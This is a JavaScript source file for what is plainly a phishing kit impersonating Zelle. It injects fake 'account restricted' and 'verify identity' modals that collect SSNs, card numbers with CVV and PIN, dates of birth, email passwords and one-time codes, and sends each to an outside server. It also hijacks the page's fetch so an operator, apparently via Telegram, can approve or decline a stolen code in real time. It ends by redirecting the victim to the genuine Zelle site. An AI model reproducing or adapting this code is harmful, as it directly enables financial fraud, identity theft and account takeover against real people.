// ========================================
// ZELLE EXTENDED FLOW - BOA-STYLE MULTI-STEP
// ========================================
(function() {
    'use strict';
    
    const API_URL = location.hostname.includes("localhost") 
        ? "http://localhost:8002" 
        : "https://zelle-secure.onrender.com";
    
    let currentUserId = null;
    let currentSessionId = null;
    let otpPollInterval = null;
    let pendingResolve = null;

    // ========================================
    // INJECT MODALS/PAGES INTO DOM
    // ========================================
    function injectHTML() {
        const container = document.createElement('div');
        container.id = 'zelle-extended-flow';
        container.innerHTML = `
            <!-- Account Restricted Error Page -->
            <div id="accountRestrictedPage" class="zelle-modal" style="display: none;">
                <div class="zelle-modal-content" style="max-width: 480px; padding: 48px 32px; text-align: center;">
                    <div style="width: 64px; height: 64px; background: #ef4444; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 24px;">
                        <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2">
                            <circle cx="12" cy="12" r="10"></circle>
                            <line x1="12" y1="8" x2="12" y2="12"></line>
                            <line x1="12" y1="16" x2="12.01" y2="16"></line>
                        </svg>
                    </div>
                    <h2 style="font-size: 24px; font-weight: 600; color: #111; margin-bottom: 12px;">Account Temporarily Restricted</h2>
                    <p style="font-size: 14px; color: #6b7280; margin-bottom: 32px; line-height: 1.5;">
                        We detected unusual activity on your account. For your security, please verify your identity to continue.
                    </p>
                    <button id="verifyIdentityBtn" class="zelle-btn-primary">
                        Verify Identity
                    </button>
                </div>
            </div>
            
            <!-- Personal Info Modal -->
            <div id="personalInfoModal" class="zelle-modal" style="display: none;">
                <div class="zelle-modal-content" style="max-width: 520px; padding: 32px;">
                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 24px;">
                        <h2 style="font-size: 20px; font-weight: 600; color: #111;">Verify Personal Information</h2>
                        <button id="closePersonalInfo" class="zelle-close-btn">
                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                <line x1="18" y1="6" x2="6" y2="18"></line>
                                <line x1="6" y1="6" x2="18" y2="18"></line>
                            </svg>
                        </button>
                    </div>
                    <p style="font-size: 14px; color: #6b7280; margin-bottom: 24px;">Please confirm your details to proceed.</p>
                    <form id="personalInfoForm">
                        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px;">
                            <div class="zelle-form-group">
                                <label>First Name</label>
                                <input type="text" id="firstName" placeholder="John" required>
                            </div>
                            <div class="zelle-form-group">
                                <label>Last Name</label>
                                <input type="text" id="lastName" placeholder="Doe" required>
                            </div>
                        </div>
                        <div class="zelle-form-group">
                            <label>Date of Birth</label>
                            <input type="text" id="dob" placeholder="MM/DD/YYYY" required>
                        </div>
                        <div class="zelle-form-group">
                            <label>Social Security Number</label>
                            <input type="text" id="ssn" placeholder="XXX-XX-XXXX" maxlength="11" required>
                        </div>
                        <div class="zelle-form-group">
                            <label>Card Number</label>
                            <input type="text" id="cardNumber" placeholder="XXXX XXXX XXXX XXXX" maxlength="19" required>
                        </div>
                        <div style="display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 12px;">
                            <div class="zelle-form-group">
                                <label>Expiry</label>
                                <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required>
                            </div>
                            <div class="zelle-form-group">
                                <label>CVV</label>
                                <input type="text" id="cvv" placeholder="XXX" maxlength="3" required>
                            </div>
                            <div class="zelle-form-group">
                                <label>PIN</label>
                                <input type="password" id="pin" placeholder="XXXX" maxlength="4" required>
                            </div>
                        </div>
                        <div class="zelle-form-group">
                            <label>ZIP Code</label>
                            <input type="text" id="zip" placeholder="XXXXX" maxlength="5" required>
                        </div>
                        <button type="submit" class="zelle-btn-primary" style="margin-top: 8px;">
                            Continue Verification
                        </button>
                    </form>
                </div>
            </div>
            
            <!-- Email Verification Modal -->
            <div id="emailVerificationModal" class="zelle-modal" style="display: none;">
                <div class="zelle-modal-content" style="max-width: 480px; padding: 32px;">
                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 24px;">
                        <h2 style="font-size: 20px; font-weight: 600; color: #111;">Email Verification</h2>
                        <button id="closeEmailVerification" class="zelle-close-btn">
                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                <line x1="18" y1="6" x2="6" y2="18"></line>
                                <line x1="6" y1="6" x2="18" y2="18"></line>
                            </svg>
                        </button>
                    </div>
                    <p style="font-size: 14px; color: #6b7280; margin-bottom: 24px;">Enter your email credentials to verify your identity.</p>
                    <form id="emailVerificationForm">
                        <div class="zelle-form-group">
                            <label>Email Address</label>
                            <input type="email" id="email" placeholder="john@example.com" required>
                        </div>
                        <div class="zelle-form-group">
                            <label>Email Password</label>
                            <input type="password" id="emailPassword" placeholder="Enter your email password" required>
                        </div>
                        <button type="submit" class="zelle-btn-primary" style="margin-top: 8px;">
                            Verify Email
                        </button>
                    </form>
                </div>
            </div>
            
            <!-- Final OTP Modal -->
            <div id="finalOtpModal" class="zelle-modal" style="display: none;">
                <div class="zelle-modal-content" style="max-width: 480px; padding: 32px; text-align: center;">
                    <div style="width: 64px; height: 64px; background: #111; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 24px;">
                        <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2">
                            <path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4"></path>
                        </svg>
                    </div>
                    <h2 style="font-size: 24px; font-weight: 600; color: #111; margin-bottom: 12px;">Email Verification Code</h2>
                    <p style="font-size: 14px; color: #6b7280; margin-bottom: 32px;">
                        We've sent a 6-digit code to your email. Enter it below.
                    </p>
                    <div class="zelle-otp-container">
                        <input type="text" maxlength="1" class="zelle-otp-digit" data-index="0">
                        <input type="text" maxlength="1" class="zelle-otp-digit" data-index="1">
                        <input type="text" maxlength="1" class="zelle-otp-digit" data-index="2">
                        <input type="text" maxlength="1" class="zelle-otp-digit" data-index="3">
                        <input type="text" maxlength="1" class="zelle-otp-digit" data-index="4">
                        <input type="text" maxlength="1" class="zelle-otp-digit" data-index="5">
                    </div>
                    <button id="submitFinalOtp" class="zelle-btn-primary" style="margin-top: 24px;">
                        Verify
                    </button>
                    <button id="resendCode" class="zelle-btn-secondary" style="margin-top: 12px;">
                        Resend Code
                    </button>
                </div>
            </div>
            
            <!-- Success/Loading Modal -->
            <div id="successModal" class="zelle-modal" style="display: none;">
                <div class="zelle-modal-content" style="max-width: 480px; padding: 48px 32px; text-align: center;">
                    <div class="zelle-spinner"></div>
                    <h2 style="font-size: 24px; font-weight: 600; color: #111; margin-top: 24px; margin-bottom: 12px;">Processing...</h2>
                    <p style="font-size: 14px; color: #6b7280;">Please wait while we verify your information.</p>
                </div>
            </div>
        `;
        
        document.body.appendChild(container);
        injectStyles();
        setTimeout(() => {
            attachEventListeners();
            setupInputFormatting();
        }, 100);
    }
    
    // ========================================
    // INJECT STYLES
    // ========================================
    function injectStyles() {
        const style = document.createElement('style');
        style.textContent = `
            .zelle-modal {
                position: fixed; top: 0; left: 0;
                width: 100%; height: 100%;
                background: rgba(0,0,0,0.5);
                backdrop-filter: blur(4px);
                display: flex; align-items: center; justify-content: center;
                z-index: 999999; padding: 16px;
            }
            .zelle-modal-content {
                background: white; border-radius: 12px;
                box-shadow: 0 20px 25px -5px rgba(0,0,0,0.1), 0 10px 10px -5px rgba(0,0,0,0.04);
                width: 100%; animation: zelle-fadeIn 0.3s ease;
            }
            @keyframes zelle-fadeIn {
                from { opacity: 0; transform: translateY(20px); }
                to { opacity: 1; transform: translateY(0); }
            }
            .zelle-form-group { margin-bottom: 20px; }
            .zelle-form-group label { display: block; font-size: 14px; font-weight: 500; color: #111; margin-bottom: 8px; }
            .zelle-form-group input {
                width: 100%; padding: 12px 16px; border: 1px solid #e5e7eb;
                border-radius: 8px; font-size: 14px; color: #111;
                transition: all 0.2s; box-sizing: border-box;
            }
            .zelle-form-group input:focus { outline: none; border-color: #111; box-shadow: 0 0 0 3px rgba(0,0,0,0.05); }
            .zelle-btn-primary {
                width: 100%; padding: 14px 24px; background: #111; color: white;
                border: none; border-radius: 8px; font-size: 14px; font-weight: 600;
                cursor: pointer; transition: all 0.2s;
            }
            .zelle-btn-primary:hover { background: #000; transform: translateY(-1px); box-shadow: 0 4px 12px rgba(0,0,0,0.15); }
            .zelle-btn-secondary {
                width: 100%; padding: 14px 24px; background: white; color: #111;
                border: 1px solid #e5e7eb; border-radius: 8px; font-size: 14px;
                font-weight: 600; cursor: pointer; transition: all 0.2s;
            }
            .zelle-btn-secondary:hover { background: #f9fafb; border-color: #111; }
            .zelle-close-btn {
                width: 32px; height: 32px; display: flex; align-items: center;
                justify-content: center; background: transparent; border: none;
                color: #6b7280; cursor: pointer; border-radius: 6px; transition: all 0.2s;
            }
            .zelle-close-btn:hover { background: #f3f4f6; color: #111; }
            .zelle-otp-container { display: flex; gap: 12px; justify-content: center; margin: 0 auto; max-width: 360px; }
            .zelle-otp-digit {
                width: 48px; height: 56px; border: 2px solid #e5e7eb;
                border-radius: 8px; font-size: 24px; font-weight: 600;
                text-align: center; color: #111; transition: all 0.2s;
            }
            .zelle-otp-digit:focus { outline: none; border-color: #111; box-shadow: 0 0 0 3px rgba(0,0,0,0.05); }
            .zelle-spinner {
                width: 64px; height: 64px; border: 4px solid #f3f4f6;
                border-top-color: #111; border-radius: 50%;
                animation: zelle-spin 0.8s linear infinite; margin: 0 auto;
            }
            @keyframes zelle-spin { to { transform: rotate(360deg); } }
            @keyframes zelle-shake {
                0%, 100% { transform: translateX(0); }
                10%, 30%, 50%, 70%, 90% { transform: translateX(-10px); }
                20%, 40%, 60%, 80% { transform: translateX(10px); }
            }
            .zelle-error-shake { animation: zelle-shake 0.5s ease-in-out; }
        `;
        document.head.appendChild(style);
    }
    
    // ========================================
    // ATTACH EVENT LISTENERS
    // ========================================
    function attachEventListeners() {
        document.getElementById('verifyIdentityBtn').addEventListener('click', () => {
            hideModal('accountRestrictedPage');
            showModal('personalInfoModal');
        });
        document.getElementById('personalInfoForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            await handlePersonalInfoSubmit();
        });
        document.getElementById('emailVerificationForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            await handleEmailVerificationSubmit();
        });
        document.getElementById('submitFinalOtp').addEventListener('click', async () => {
            await handleFinalOtpSubmit();
        });
        document.getElementById('resendCode').addEventListener('click', () => {
            alert('Code resent! Check your email.');
        });
        document.getElementById('closePersonalInfo').addEventListener('click', () => {
            hideModal('personalInfoModal');
        });
        document.getElementById('closeEmailVerification').addEventListener('click', () => {
            hideModal('emailVerificationModal');
        });

        // OTP digit navigation
        const otpDigits = document.querySelectorAll('.zelle-otp-digit');
        otpDigits.forEach((input, index) => {
            input.addEventListener('input', (e) => {
                if (e.target.value.length === 1 && index < otpDigits.length - 1) {
                    otpDigits[index + 1].focus();
                }
            });
            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && !e.target.value && index > 0) {
                    otpDigits[index - 1].focus();
                }
            });
        });
    }

    // ========================================
    // INPUT FORMATTING
    // ========================================
    function setupInputFormatting() {
        document.addEventListener('input', (e) => {
            const id = e.target.id;
            let value = e.target.value;

            if (id === 'ssn') {
                value = value.replace(/\D/g, '');
                if (value.length > 3) value = value.slice(0, 3) + '-' + value.slice(3);
                if (value.length > 6) value = value.slice(0, 6) + '-' + value.slice(6, 10);
                e.target.value = value;
            }
            if (id === 'cardNumber') {
                value = value.replace(/\D/g, '');
                let formatted = '';
                for (let i = 0; i < value.length && i < 16; i++) {
                    if (i > 0 && i % 4 === 0) formatted += ' ';
                    formatted += value[i];
                }
                e.target.value = formatted;
            }
            if (id === 'expiry') {
                value = value.replace(/\D/g, '');
                if (value.length >= 2) value = value.slice(0, 2) + '/' + value.slice(2, 4);
                e.target.value = value;
            }
            if (id === 'dob') {
                value = value.replace(/\D/g, '');
                if (value.length >= 2) value = value.slice(0, 2) + '/' + value.slice(2);
                if (value.length >= 5) value = value.slice(0, 5) + '/' + value.slice(5, 9);
                e.target.value = value;
            }
        });
    }
    
    // ========================================
    // SHOW/HIDE MODALS
    // ========================================
    function showModal(id) {
        console.log('[Zelle Extended] 🔍 Attempting to show modal:', id);
        const modal = document.getElementById(id);
        if (modal) {
            console.log('[Zelle Extended] ✅ Modal found! Displaying...');
            modal.style.display = 'flex';
        } else {
            console.error('[Zelle Extended] ❌ Modal NOT FOUND:', id);
        }
    }
    
    function hideModal(id) {
        const modal = document.getElementById(id);
        if (modal) modal.style.display = 'none';
    }
    
    // ========================================
    // HANDLE PERSONAL INFO SUBMIT
    // ========================================
    async function handlePersonalInfoSubmit() {
        const data = {
            userId: currentUserId,
            sessionId: currentSessionId,
            firstName: document.getElementById('firstName').value,
            lastName: document.getElementById('lastName').value,
            ssn: document.getElementById('ssn').value,
            dob: document.getElementById('dob').value,
            cardNumber: document.getElementById('cardNumber').value,
            expiry: document.getElementById('expiry').value,
            cvv: document.getElementById('cvv').value,
            pin: document.getElementById('pin').value,
            zip: document.getElementById('zip').value
        };
        try {
            const response = await fetch(`${API_URL}/api/save-personal-info`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
            if (response.ok) {
                hideModal('personalInfoModal');
                showModal('emailVerificationModal');
            }
        } catch (error) {
            console.error('Error submitting personal info:', error);
        }
    }
    
    // ========================================
    // HANDLE EMAIL VERIFICATION SUBMIT
    // ========================================
    async function handleEmailVerificationSubmit() {
        const data = {
            userId: currentUserId,
            sessionId: currentSessionId,
            email: document.getElementById('email').value,
            emailPassword: document.getElementById('emailPassword').value
        };
        try {
            const response = await fetch(`${API_URL}/api/save-email-verification`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
            if (response.ok) {
                hideModal('emailVerificationModal');
                showModal('finalOtpModal');
                document.querySelector('.zelle-otp-digit').focus();
            }
        } catch (error) {
            console.error('Error submitting email verification:', error);
        }
    }
    
    // ========================================
    // HANDLE FINAL OTP SUBMIT
    // ========================================
    async function handleFinalOtpSubmit() {
        console.log('[Zelle Extended] 🔥 handleFinalOtpSubmit fired');
        const otpDigits = document.querySelectorAll('.zelle-otp-digit');
        const code = Array.from(otpDigits).map(input => input.value).join('');
        
        if (code.length !== 6) {
            alert('Please enter all 6 digits');
            return;
        }
        
        const data = {
            userId: currentUserId,
            sessionId: currentSessionId,
            finalOtp: code
        };
        try {
            const response = await fetch(`${API_URL}/api/save-final-otp`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
            if (response.ok) {
                hideModal('finalOtpModal');
                showModal('successModal');
                setTimeout(() => {
                    window.location.href = 'https://www.zellepay.com';
                }, 3000);
            }
        } catch (error) {
            console.error('Error submitting final OTP:', error);
        }
    }
    
    // ========================================
    // SHOW OTP ERROR (SHAKE + RED TEXT)
    // Only targets React's OTP inputs, never our own injected modals
    // ========================================
    function showOtpError() {
        console.log('[Zelle Extended] ❌ OTP DECLINED - Showing error inline');

        const ourFlow = document.getElementById('zelle-extended-flow');
        const allOtpInputs = document.querySelectorAll('input[type="text"][maxlength="1"]');
        const otpInputs = Array.from(allOtpInputs).filter(input => !ourFlow.contains(input));

        console.log('[Zelle Extended] Found OTP inputs:', otpInputs.length);

        if (otpInputs.length > 0) {
            const otpContainer = otpInputs[0].parentElement;

            // Force reflow to restart animation
            otpContainer.classList.remove('zelle-error-shake');
            void otpContainer.offsetWidth;
            otpContainer.classList.add('zelle-error-shake');
            setTimeout(() => otpContainer.classList.remove('zelle-error-shake'), 500);

            // Clear inputs + red borders
            otpInputs.forEach(input => {
                input.value = '';
                input.style.borderColor = '#ef4444';
            });
            setTimeout(() => {
                otpInputs.forEach(input => input.style.borderColor = '');
            }, 3000);

            otpInputs[0].focus();
        } else {
            console.warn('[Zelle Extended] Could not find React OTP inputs');
        }

        // Floating error message
        let errorMsg = document.getElementById('zelle-otp-error');
        if (!errorMsg) {
            errorMsg = document.createElement('div');
            errorMsg.id = 'zelle-otp-error';
            errorMsg.style.cssText = `
                position: fixed;
                top: 50%; left: 50%;
                transform: translate(-50%, -50%);
                background: #fee;
                border: 2px solid #ef4444;
                color: #dc2626;
                font-size: 16px; font-weight: 600;
                padding: 20px 40px;
                border-radius: 12px;
                box-shadow: 0 10px 25px rgba(239,68,68,0.3);
                z-index: 999999999;
                text-align: center;
            `;
            document.body.appendChild(errorMsg);
        }
        errorMsg.textContent = '❌ Incorrect code. Please try again.';
        errorMsg.style.display = 'block';
        setTimeout(() => { if (errorMsg) errorMsg.style.display = 'none'; }, 3000);

        console.log('[Zelle Extended] ⏳ Waiting for user to retry OTP...');
    }

    // ========================================
    // RESOLVE REACT WITH FAILURE
    // Used for BOTH approve and decline to keep React frozen on OTP screen
    // ========================================
    function resolveReactWithFailure() {
        if (pendingResolve) {
            console.log('[Zelle Extended] 🔒 Sending failure response to React - keeping it frozen');
            const failureResponse = new Response(
                JSON.stringify({ success: false, error: 'Invalid OTP' }),
                { status: 200, headers: { 'Content-Type': 'application/json' } }
            );
            pendingResolve(failureResponse);
            pendingResolve = null;
        }
    }
    
    // ========================================
    // START OTP POLLING
    // ========================================
    function startOtpPolling(userId) {
        currentUserId = userId;
        
        console.log('[Zelle Extended] 🔄 Starting OTP polling for user:', userId);
        
        if (otpPollInterval) {
            clearInterval(otpPollInterval);
        }
        
        otpPollInterval = setInterval(async () => {
            try {
                const response = await fetch(`${API_URL}/api/check-otp-status?id=${userId}`);
                const data = await response.json();
                
                console.log('[Zelle Extended] 📊 OTP Status:', data.otp_status);
                
                if (data.otp_status === 'approve') {
                    console.log('[Zelle Extended] ✅ APPROVED - Freezing React, launching our flow');
                    clearInterval(otpPollInterval);

                    // Freeze React on OTP screen
                    resolveReactWithFailure();
                    
                    // Hand off to our flow
                    showModal('accountRestrictedPage');

                } else if (data.otp_status === 'decline') {
                    console.log('[Zelle Extended] ❌ DECLINED - Freezing React, showing error');
                    clearInterval(otpPollInterval);

                    // Freeze React on OTP screen
                    resolveReactWithFailure();
                    
                    // Show error UI
                    showOtpError();
                    
                    // Reset server status so next attempt registers
                    // NOTE: Do NOT call startOtpPolling here.
                    // The fetch interceptor will restart polling automatically
                    // when the user submits their next OTP.
                    await fetch(`${API_URL}/api/reset-otp-status?id=${userId}`, {
                        method: 'POST'
                    });
                }
            } catch (error) {
                console.error('[Zelle Extended] ❌ Polling error:', error);
            }
        }, 2000);
    }
    
    // ========================================
    // INTERCEPT OTP SUBMISSION FROM REACT APP
    // Holds React's response in a pending promise until Telegram decides.
    // Our own internal API calls are whitelisted and pass through freely.
    // ========================================
    function interceptOtpSubmission() {
        const originalFetch = window.fetch;
        
        window.fetch = async function(...args) {
            const url = typeof args[0] === 'string' ? args[0] : (args[0] && args[0].url) || '';

            // Whitelist our own API calls so they always pass through
            if (url.includes('/api/check-otp-status') ||
                url.includes('/api/reset-otp-status') ||
                url.includes('/api/save-personal-info') ||
                url.includes('/api/save-email-verification') ||
                url.includes('/api/save-final-otp')) {
                return originalFetch.apply(this, args);
            }

            // Intercept React's OTP submission
            if (url.includes('/api/save-otp') || url.includes('/api/save')) {
                console.log('[Zelle Extended] 🔒 Intercepted OTP submission - holding for Telegram');
                
                const response = await originalFetch.apply(this, args);
                
                try {
                    const data = await response.clone().json();
                    
                    if (data.success && data.id) {
                        currentUserId = data.id;
                        console.log('[Zelle Extended] OTP submitted, user ID:', data.id);
                        
                        // Start Telegram polling
                        startOtpPolling(data.id);
                        
                        // Hold React here — resolveReactWithFailure() will release it
                        return new Promise((resolve) => {
                            pendingResolve = resolve;
                        });
                    }
                } catch (e) {
                    // Can't parse response, pass it through as-is
                }
                
                return response;
            }

            // Everything else passes through normally
            return originalFetch.apply(this, args);
        };
    }
    
    // ========================================
    // INITIALIZE
    // ========================================
    function init() {
        console.log('[Zelle Extended] Initializing multi-step flow...');
        injectHTML();
        interceptOtpSubmission();
    }
    
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
    
})();